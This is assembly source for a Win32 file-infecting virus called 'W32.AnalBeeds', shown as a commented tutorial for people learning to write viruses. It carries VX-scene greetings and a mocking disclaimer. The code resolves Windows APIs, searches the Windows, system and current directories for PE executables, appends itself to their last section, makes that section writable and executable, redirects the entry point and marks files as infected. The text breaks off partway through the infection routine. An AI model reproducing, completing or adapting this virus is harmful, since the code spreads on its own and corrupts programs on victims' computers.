   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   ;
   ; [ I N T R O ]
   ;   This virus has nothing special in it other than to be a straight
   ;   forward examples for others who wannt to learn, the virus is
   ;   heavily commented and tested, so it should work and you can then
   ;   later make new stuff after you have learnt from this one, simple
   ;   as that so have fun :)
   ;
   ;
   ; [ V I R U S   I N F O R M A T I O N ]
   ;   Name       : W32.AnalBeeds
   ;   Size       : 8,192 Bytes
   ;   Infects    : PE EXE Files
   ;   Payload    : None
   ;   Description: When the virus is first executed it first gets
   ;                the API addresses of the API's we are going to use
   ;                the method am using is by the following:
   ;                   - locating the image base of kernel32.dll
   ;                   - Locate LoadLibraryA by examining the exports
   ;                     of kernel32
   ;                   - Load user32.dll
   ;                   - Locate API's we want to get their address
   ;                   - Get thie addresses
   ;                   - Save them to use them again later
   ;                Then the virus tries to infect the files in 3 different folder
   ;                like windows, system and current directory after it found PE files
   ;                it tries to infect them by appending to the PE file's last sectoin
   ;                and increases it to fit for the virus as well, and then exits.
   ;
   ;
   ; [ G R E E T I N G S ]
   ;   DR-EF, VxF, BlueOwl, DiA, Toro, Knowdeth, Capoeira
   ;   Benny, Z0mbie, Belial, Ratter, GriYo, VirusBuster
   ;   SlageHammer, VirusJoe, SnakeMan, P0sitron, i0n
   ;   Cyclone00, Metal and all other people
   ;   i forgot to mention so sorry if i did
   ;
   ; [ S P E C I A L  T H A N K S]
   ;   BlueOwl, VxF, DR-EF, Toro SlageHammer for finding bugs, beta testing
   ;   and helping me with this one
   ;
   ; [ S H O U T S ]
   ;   Excentric  --
   ;   ACiD-WaRZ     \
   ;   rustymemory   |-->  { Obp + Fsec }
   ;   lordx         /
   ;   pronco     --
   ;
   ;   Sven Jaschan, Chen Ing-Hau, Gigabyte
   ;
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   ;
   ;
   ; $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ ;
   ; $---------------------( D I S C L A I M E R )---------------------$ ;
   ; $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ ;
   ;                                                                     ;
   ;  SUE ME FOR WRITTING THIS :)                                        ;
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


   .386

   .model flat

   .data
       dummy   dd 0

   .code
   VirusStart:

       call    GetDelta

   GetDelta:
       pop ebp
       sub ebp, offset GetDelta

       mov eax, [esp]                      ; At the very beginning the first dword on the stack
                                       ; Contains a pointer inside kernel32
       or  eax, 00000FFFh                      ; The image base has to be a multiple of the memory alignment
       xor eax, 00000FFFh

   compare:
       cmp word ptr [eax], 'ZM'
       je  kernel32_found
       sub eax, 1000h
       jmp compare

   kernel32_found:
       mov dword ptr [ebp + _Kernel32], eax
       lea esi, [ebp + __API_LoadLibraryA]
       call    GetFunctionAddress
       lea ebx, [ebp + offset __DLL_User32]
       push    ebx
       call    eax                         ; Load user32.dll
                                       ; in return, eax = image base of user32
       lea esi, [ebp + __API_MessageBoxA]
       call    GetFunctionAddress
       mov [ebp + __ADDR_MessageBoxA], eax


       mov eax, [ebp + _Kernel32]
       lea esi, [ebp + __API_ExitProcess]
       call    GetFunctionAddress
       mov [ebp + __ADDR_ExitProcess], eax

       mov eax, [ebp + _Kernel32]
       lea esi, [ebp + __API_FindFirstFileA]
       call    GetFunctionAddress
       mov [ebp + __ADDR_FindFirstFileA], eax

       mov eax, [ebp + _Kernel32]
       lea esi, [ebp + __API_FindNextFileA]
       call    GetFunctionAddress
       mov [ebp + __ADDR_FindNextFileA], eax

       mov eax, [ebp + _Kernel32]
       lea esi, [ebp + __API_GetFileAttributesA]
       call    GetFunctionAddress
       mov [ebp + __ADDR_GetFileAttributesA], eax

       mov eax, [ebp + _Kernel32]
       lea esi, [ebp + __API_SetFileAttributesA]
       call    GetFunctionAddress
       mov [ebp + __ADDR_SetFileAttributesA], eax

       mov eax, [ebp + _Kernel32]
       lea esi, [ebp + __API_CreateFileA]
       call    GetFunctionAddress
       mov [ebp + __ADDR_CreateFileA], eax

       mov eax, [ebp + _Kernel32]
       lea esi, [ebp + __API_GetFileTime]
       call    GetFunctionAddress
       mov [ebp + __ADDR_GetFileTime], eax

       mov eax, [ebp + _Kernel32]
       lea esi, [ebp + __API_GetFileSize]
       call    GetFunctionAddress
       mov [ebp + __ADDR_GetFileSize], eax

       mov eax, [ebp + _Kernel32]
       lea esi, [ebp + __API_CreateFileMappingA]
       call    GetFunctionAddress
       mov [ebp + __ADDR_CreateFileMappingA], eax

       mov eax, [ebp + _Kernel32]
       lea esi, [ebp + __API_MapViewOfFile]
       call    GetFunctionAddress
       mov [ebp + __ADDR_MapViewOfFile], eax

       mov eax, [ebp + _Kernel32]
       lea esi, [ebp + __API_UnmapViewOfFile]
       call    GetFunctionAddress
       mov [ebp + __ADDR_UnmapViewOfFile], eax

       mov eax, [ebp + _Kernel32]
       lea esi, [ebp + __API_CloseHandle]
       call    GetFunctionAddress
       mov [ebp + __ADDR_CloseHandle], eax

       mov eax, [ebp + _Kernel32]
       lea esi, [ebp +  __API_SetFileTime]
       call    GetFunctionAddress
       mov [ebp + __ADDR_SetFileTime], eax

       mov eax, [ebp + _Kernel32]
       lea esi, [ebp + __API_SetFilePointer]
       call    GetFunctionAddress
       mov [ebp + __ADDR_SetFilePointer], eax

       mov eax, [ebp + _Kernel32]
       lea esi, [ebp + __API_GetWindowsDirectoryA]
       call    GetFunctionAddress
       mov [ebp + __ADDR_GetWindowsDirectoryA], eax

       mov eax, [ebp + _Kernel32]
       lea esi, [ebp + __API_GetSystemDirectoryA]
       call    GetFunctionAddress
       mov [ebp + __ADDR_GetSystemDirectoryA], eax

       mov eax, [ebp + _Kernel32]
       lea esi, [ebp + __API_GetCurrentDirectoryA]
       call    GetFunctionAddress
       mov [ebp + __ADDR_GetCurrentDirectoryA], eax

       mov eax, [ebp + _Kernel32]
       lea esi, [ebp + __API_SetCurrentDirectoryA]
       call    GetFunctionAddress
       mov [ebp + __ADDR_SetCurrentDirectoryA], eax

       mov eax, [ebp + _Kernel32]
       lea esi, [ebp + __API_SetEndOfFile]
       call    GetFunctionAddress
       mov [ebp + __ADDR_SetEndOfFile], eax



       push    dword ptr [ebp + oldip]                 ; **
       push    dword ptr [ebp + imagebase]             ; **

       call    InfectDirectories                   ; Infect the directories


       pop dword ptr [ebp + imagebase]             ; **
       pop dword ptr [ebp + oldip]                 ; **

   GetOut:
       cmp ebp, 0                          ; First generation ?
       je  ExitNow
       mov eax, [ebp + offset oldip]               ; Restore old IP
       add eax, [ebp + imagebase]                  ; Align to memory **EBP
       jmp eax                         ; And run host

   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   ;; As  you  can  see, the returning to the host is very easy! ;;
   ;; You simply retrieve  the  saved value from oldip, you add  ;;
   ;; the image base where the host is loaded and you make a JMP ;;
   ;; to it                                                      ;;
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

   ExitNow:
       push    0
       call    [ebp + __ADDR_ExitProcess]

   ;---------------------------------------------------------------------------
   ; GetFunctionAddress
   ;---------------------------------------------------------------------------
   ; Input parameters:
   ; esi = offset of a zeroe terminated string with the name of the Api.
   ; eax = image base of the dll where the API resides
   ; Returns:
   ; eax = address of desired API
   ;---------------------------------------------------------------------------
   GetFunctionAddress PROC
       mov ebx, [eax + 3Ch]                    ; Pointer to pe header
       add ebx, eax
       add ebx, 120
       mov ebx, [ebx]
       add ebx, eax                        ; EBX = Export Address
       xor edx, edx
       mov ecx, [ebx + 32]
       add ecx, eax
       push    esi
       push    edx

   CompareNext:
       pop edx
       pop esi
       inc edx
       mov edi, [ecx]
       add edi, eax
       add ecx, 4
       push    esi
       push    edx

   CompareName:
       mov dl, [edi]
       mov dh, [esi]
       cmp dl, dh
       jne CompareNext
       inc edi
       inc esi
       cmp byte ptr [esi], 0
       je  GetAddress
       jmp CompareName

   GetAddress:
       pop edx
       pop esi
       dec edx
       shl edx, 1
       mov ecx, [ebx + 36]
       add ecx, eax
       add ecx, edx
       xor edx, edx
       mov dx, [ecx]
       shl edx, 2
       mov ecx, [ebx + 28]
       add ecx, eax
       add ecx, edx
       add eax, [ecx]

       ret

   GetFunctionAddress  ENDP




   ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   ;@============[ Changing Directories ]============@;
   ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;

   InfectDirectories   proc
       push    128
       lea eax, [ebp + offset windir]
       push    eax
       call    [ebp + __ADDR_GetWindowsDirectoryA]

       push    128
       lea eax, [ebp + offset sysdir]
       push    eax
       call    [ebp + __ADDR_GetSystemDirectoryA]

       lea eax, [ebp + offset crtdir]
       push    eax
       push    128
       call    [ebp + __ADDR_GetCurrentDirectoryA]

       lea eax, [ebp + offset windir]
       push    eax
       call    [ebp + __ADDR_SetCurrentDirectoryA]

       mov dword ptr [ebp + offset infections], 14h       ; ** 3
       call    InfectCurrentDirectory

       lea eax, [ebp + offset sysdir]
       push    eax
       call    [ebp + __ADDR_SetCurrentDirectoryA]

       mov dword ptr [ebp + offset infections], 14h       ; ** 3
       call    InfectCurrentDirectory

       lea eax, [ebp + offset crtdir]
       push    eax
       call    [ebp + __ADDR_SetCurrentDirectoryA]

       ret

   InfectDirectories   endp


   ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   ;@============[ Finding Files To Infect ]============@;
   ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;

   InfectCurrentDirectory   proc
       lea edi, [ebp + offset search]              ; Point to search record
       lea eax, [ebp + offset search]              ; Point to search record
       push    eax                         ; Push the address of the search record
       lea eax, [ebp + offset exestr]              ; Point to file mask
       push    eax                         ; Push the address of file mask
       call    [ebp + __ADDR_FindFirstFileA]               ; Find first matching file

   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   ;; If no file was found, EAX = 0FFFFFFFFh, otherwise ;;
   ;; EAX = new handle                                  ;;
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

       inc eax                         ; Check EAX = -1
       jz  NoFilesFound                        ; No more files ?
       dec eax                         ; Restore EAX
       push    eax                         ; Save handle
       lea esi, [edi.FileName]                 ; ESI = pointer to filename
       mov ecx, [edi.FileSizeLow]                  ; ECX = filesize

   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   ;; EDI was used because EDI was firstly pointing to  ;;
   ;; the search record structure and now ESI points to ;;
   ;; the file name and ECX holds the file size, so     ;;
   ;; thats what we need for now                        ;;
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

       call    InfectFile                      ; Infect file

   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   ;; If the file was infected correctly the carry flag ;;
   ;; is cleared, otherwise it will be set, it its      ;;
   ;; cleared then we will have to decrease the number  ;;
   ;; of already infected files                         ;;
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

       jc  AnotherFile                     ; Find another file to infect
       dec dword ptr [ebp + offset infections]         ; Decrement infection count

   AnotherFile:
       push    edi                         ; Save search record address
       lea edi, [edi.FileName]
       mov ecx, 13d
       mov al, 0
       rep stosb
       pop edi                         ; Restore search record address
       pop eax                         ; Restore file handle
       push    eax                         ; Save the file handle again
       push    edi                         ; Push find zone
       push    eax                         ; Push handle
       call    [ebp + __ADDR_FindNextFileA]                ; Find the next matching file

       test    eax, eax                        ; No more files ?
       jz  AllDone                         ; Finsihed ?
       lea esi, [edi.FileName]                 ; ESI = pointer to filename
       mov ecx, [edi.FileSizeLow]                  ; ECX = filesize
       call    InfectFile                      ; Infect file
       jc  FailedToInfectFile                  ; Did we fail to infect ?
       dec dword ptr [ebp + offset infections]         ; Decrement infection count

   FailedToInfectFile:
       cmp dword ptr [ebp + infections], 0             ; Are we done yet ?
       jne AnotherFile                     ; Infect another file

   AllDone:
       pop eax                         ; Restore file hadle

   NoFilesFound:
       ret                             ; Return

   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   ;; So what we have done so far is that we have       ;;
   ;; searched for the first matching file and called   ;;
   ;; the infecting procedure, then you can try to      ;;
   ;; locate another file, all until no more files were ;;
   ;; found or the maximum number of infections was     ;;
   ;; reached                                           ;;
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

   InfectCurrentDirectory   endp


   ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   ;@============[ Infecting The File ]============@;
   ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;

   InfectFile  proc

   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   ;; Now after we have located the file that we want   ;;
   ;; to infect we must do something before we go and   ;;
   ;; play with it :), but for now remember that        ;;
   ;; -) ESI points to the filename                     ;;
   ;; -) ECX holds the file size                        ;;
   ;;                                                   ;;
   ;; Its time to start infecting the file this is easy ;;
   ;; under Win32 environment and we can achieve that   ;;
   ;; by manipulating the file itself but first by      ;;
   ;; mapping the file                                  ;;
   ;; By mapping you should understand this: a memory   ;;
   ;; area is allocated and the entire file is          ;;
   ;; mapped there, this means that you work directly   ;;
   ;; into memory  and everything that you do there is  ;;
   ;; reflected in the physical file also, all the      ;;
   ;; relative addresses inside the file start from the ;;
   ;; address of the map, here you must be very         ;;
   ;; attentive not to mix the file handle with the     ;;
   ;; map handle                                        ;;
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

       pushad                              ; Save all registers

       mov dword ptr [ebp + newfilesize], ecx          ; Save file size
       mov word ptr [ebp + infectionflag], 0           ; Reset the infection flag
       add ecx, viruslen                       ; ECX = victim filesize + virus
       add ecx, 1000h                      ; ECX = victim filesize + virus + 1000h
       mov [ebp + offset memory], ecx              ; Memory to map

   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   ;; When mapping a file we need an amount of memory   ;;
   ;; equal to the original file plus the virus length  ;;
   ;; which will be appended, plus some extra work      ;;
   ;; space, If you dont allocate enough memory for the ;;
   ;; map, when trying to write over the boundaries of  ;;
   ;; the map, the virus will generate an invalid fault ;;
   ;; page                                              ;;
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   ;; Now lets start first by saving the original       ;;
   ;; attributes                                        ;;
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


       ; ** can be gotten from win32_find_data

       mov [ebp + offset fileofs], esi             ; ESI = pointer to filename ***
       push    esi                         ; Save it
       call    [ebp + __ADDR_GetFileAttributesA]           ; Get the file attributes
       cmp eax, 0
       mov [ebp + fileattributes], eax             ; Save them

   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   ;; Now lets set the nomral attributes to the file    ;;
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

       push    80h
       push    esi
       call    [ebp + __ADDR_SetFileAttributesA]           ; Set them to normal

   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   ;; Now lets open the file                            ;;
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

       push    0                           ; File template
       push    0                           ; File attributes
       push    3                           ; Open existing file
       push    0                           ; Security option = default
       push    1                           ; File share for read
       push    80000000h or 40000000h                  ; General write and read
       push    esi                         ; pointer to filename
       call    [ebp + __ADDR_CreateFileA]              ; Call API
                                       ; EAX = file handle

       mov [ebp + offset filehandle], eax              ; Save file handle
       cmp eax, -1                         ; error ?
       je  InfectionError                      ; cant open the file ?

   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   ;; Now lets save the following                       ;;
   ;; -) File creation time                             ;;
   ;; -) Last write time                                ;;
   ;; -) Last access time                               ;;
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

       ; ** can be gotten from win32_find_data

       lea ebx, [ebp + offset ftcreation]
       push    ebx
       add ebx, 8
       push    ebx
       add ebx, 8
       push    ebx
       push    eax
       call    [ebp + __ADDR_GetFileTime]

   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   ;; Now lets get the file size and save it for later  ;;
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

       push    0                           ; Save the filesize for later
       push    dword ptr [ebp + offset filehandle]
       call    [ebp + __ADDR_GetFileSize]
       ;add     dword ptr [ebp + offset newfilesize], eax               ; ** mov -> add

   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   ;; Now lets go create the file mapping for the file  ;;
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

       push    0                           ; Filename handle = NULL
       push    dword ptr [ebp + offset memory]             ; Max size
       push    0                           ; Min size (no need)
       push    4                           ; Page read and write
       push    0                           ; Security attributes
       push    dword ptr [ebp + offset filehandle]         ; File handle
       call    [ebp + __ADDR_CreateFileMappingA]           ; Call API
                                       ; EAX = new map handle

       mov [ebp + offset maphandle], eax               ; Save map handle
       cmp eax, 0                          ; Error ?
       je  CloseFile                       ; Cant map file ?

   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   ;; Now if we were lucky and had the map of the file  ;;
   ;; next step is to map the view of that file         ;;
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

       push    dword ptr [ebp + offset memory]             ; Bytes to map
       push    0                           ; File offset
       push    0                           ; File offset
       push    2                           ; File Map Write Mode
       push    eax                         ; File Map Handle
       call    [ebp + __ADDR_MapViewOfFile]                ; Call API

       cmp eax, 0                          ; Error ?
       je  CloseMap                        ; Cant map view of file ?
       mov esi, eax                        ; ESI = base of map
       mov [ebp + offset mapaddress], esi              ; Save base of map

   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   ;; The file is now opened and we can work on it      ;;
   ;; knowing that it is mapped at the ESI address, but ;;
   ;; we have to check at first whether its an EXE file ;;
   ;; and if its a PE file actually                     ;;
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

       cmp word ptr [esi], 'ZM'                    ; Is it an EXE file ?
       jne UnmapView                       ; Error ?
       cmp word ptr [esi + 38h], 'MS'              ; Already infected ?
       jne OkGo                            ; Is it a PE EXE file ?
       mov word ptr [ebp + infectionflag], 0FFh            ; Mark it
       jmp UnmapView                       ; Error ?

   OkGo:
       mov ebx, dword ptr [esi + 3ch]              ; EBX = PE Header
       cmp word ptr [esi + ebx], 'EP'              ; Is it a PE file ?
       jne UnmapView                       ; Error ?

   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   ;; If the file is not EXE, is already infected or is ;;
   ;; not a PE file, we proceed to unmap the view of    ;;
   ;; file, otherwise we continue                       ;;
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

       add esi, ebx                        ; ESI points to PE header
       mov [ebp + offset PEheader], esi                ; Save it
       mov eax, [esi + 28h]                    ; EAX = IP of file
       mov [ebp + offset oldip], eax               ; Save it

   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   ;; The oldip value is the one we save and use for    ;;
   ;; when we want to return to the original host       ;;
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
       ;;ADDED
       mov eax, [esi + 34h]
       mov [ebp + imagebase], eax

       mov eax, [esi + 3ch]                    ; EAX = file alignement
       mov [ebp + offset filealign], eax               ; Save it

   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   ;; When we append the virus to the PE file we        ;;
   ;; increase it's size, But the file alignment must   ;;
   ;; be preserved, the file alignment is a number      ;;
   ;; which divides the file size exactly               ;;
   ;; (filesize mod filealign = 0)                      ;;
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   ;; Now the real work starts as we have prepared      ;;
   ;; everything necessary for the virus to infect the  ;;
   ;; file, we start first by locating the last section ;;
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

       push    esi

       mov ebx, [esi + 74h]                    ; Number of directories entries
       shl ebx, 3                          ; * 8 (size)
       xor eax, eax
       mov ax, word ptr [esi + 6h]                 ; AX = number of sections
       dec eax                         ; Look for the last section ending
       mov ecx, 28h                        ; ECX = size of sections header
       mul ecx                         ; EAX = ECX * EAX
       add esi, 78h
       add esi, ebx
       add esi, eax                        ; ESI = Pointer to the last section header

       pop ebx                         ; ** ebx = old peheader

   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   ;; The formula used is like this                     ;;
   ;;                                                   ;;
   ;;  Address of the last sections header =            ;;
   ;;  (Directory Table) +                              ;;
   ;;  (Number of Directories) * (Directory Size) +     ;;
   ;;  (Number of Sections - 1) * (Section header size) ;;
   ;;                                                   ;;
   ;;      The Directory size is 8.                     ;;
   ;;      The Section Header size is 28h.              ;;
   ;;      The pointer to the Directory Table is 78h    ;;
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

       or  dword ptr [esi + 24h], 00000020h            ; Set [CWE] flags (CODE)
       or  dword ptr [esi + 24h], 20000000h            ; Set [CWE] flags (EXECUTABLE)
       or  dword ptr [esi + 24h], 80000000h            ; Set [CWE] flags (WRITABLE)

   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   ;; The flags are very important, They tell the       ;;
   ;; loader that the section now has executable code   ;;
   ;; and it is writable                                ;;
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

       mov eax, [esi + 10h]                    ; EAX = size of raw data in this section
       mov [ebp + offset oldrawsize], eax              ; Save it
       add dword ptr [esi + 8h], viruslen              ; Increase virtual size

   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   ;; Update ImageBase                                  ;;
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

       mov eax, [esi + 8h]                     ; Get new size in EAX
       add eax, [esi + 12]                     ; + section rva
       mov [ebx + 80], eax

   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   ;; The size of raw data is the actual size of the    ;;
   ;; data in the section, The virtual size is the one  ;;
   ;; we must increase with our virus size, Now after   ;;
   ;; the increasing, lets check how much did we mess   ;;
   ;; the file align, To do that we divide the new size ;;
   ;; to the filealign value and we get as a reminder   ;;
   ;; the number of bytes to pad                        ;;
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

       mov eax, [esi + 8h]                     ; Get new size in EAX
       mov ecx, [ebp + offset filealign]               ; ECX = File alignment
       div ecx                         ; Get remainder in EDX
       mov ecx, [ebp + offset filealign]               ; ECX = File alignment
       sub ecx, edx                        ; Number of bytes to pad
       mov [esi + 10h], ecx                    ; Save it

   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   ;; Now size of raw data = number of bytes to pad     ;;
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

       mov eax, [esi + 8h]                     ; Get current VirtualSize
       add eax, [esi + 10h]                    ; EAX = SizeOfRawdata padded
       mov [esi + 10h], eax                    ; Set new SizeOfRawdata

   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   ;; Now size of raw data = old virtual size +         ;;
   ;; number of bytes to pad                            ;;
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

       mov [ebp + offset newrawsize], eax              ; Save it

   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   ;; The virus will be at the end of the section, In   ;;
   ;; order to find its address we have the following   ;;
   ;; formula                                           ;;
   ;;                                                   ;;
   ;; VirtualAddress + VirtualSize - VirusLength        ;;
   ;;      + RawSize = VirusStart                       ;;
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

       mov eax, [esi + 12]                     ; Get VirtualAddress
       add eax, [esi + 16d]                    ; Add VirtualSize, Rawsize
       sub eax, viruslen                       ; Subtract the size of virus
       mov [ebp + offset newip], eax               ; EAX = new EIP, and save it

   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   ;; Here we compute with how much did we increase     ;;
   ;; the size of raw data                              ;;
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

       mov eax, [ebp + offset oldrawsize]              ; Original SizeOfRawdata
       mov ebx, [ebp + offset newrawsize]              ; New SizeOfRawdata
       sub ebx, eax                        ; Increase in size
       mov [ebp + offset incrawsize], ebx              ; Save increase value

   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   ;; Compute the new file size                         ;;
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

       mov eax, [esi + 14h]                    ; File offset of section raw data
       add eax, [ebp + offset newrawsize]              ; Add size of new raw data
       mov [ebp + offset newfilesize], eax             ; EAX = new filesize, and save it

   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   ;; Now prepare to copy the virus to the host, The    ;;
   ;; formulas are                                      ;;
   ;;                                                   ;;
   ;; Address to copy to = Map Address +                ;;
   ;;                      Last Section Address +       ;;
   ;;                      Last Section Virtual Size -  ;;
   ;;                      Virus Length                 ;;
   ;;                                                   ;;
   ;; Address to copy from = the start                  ;;
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

       mov eax, [esi + 14h]                    ; File offset of section raw data
       add eax, [esi + 16]                     ; Add rawsize of section
       sub eax, viruslen                       ; Subtract the virus size from it
       add eax, [ebp + offset mapaddress]              ; Align in memory to map address

       mov edi, eax                        ; Location to copy the virus to
       lea esi, [ebp + offset VirusStart]              ; Location to copy the virus from
       mov ecx, viruslen                       ; Number of bytes to copy
       rep movsb                           ; Copy all the bytes

   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   ;; Now, lets alter furthur the PE header by marking  ;;
   ;; the new IP, increasing the total size of the      ;;
   ;; files image with the increasing of the last       ;;
   ;; section                                           ;;
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

       mov esi, [ebp + offset PEheader]                ; ESI = Address of PE header
       mov eax, [ebp + offset newip]               ; Get value of new EIP in EAX
       mov [esi + 28h], eax                    ; Write it to the PE header

   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   ;; Now, lets mark the file as infected               ;;
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

       mov esi, [ebp + offset mapaddress]
       mov word ptr [esi + 38h], 'MS'              ; Mark file as infected

   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
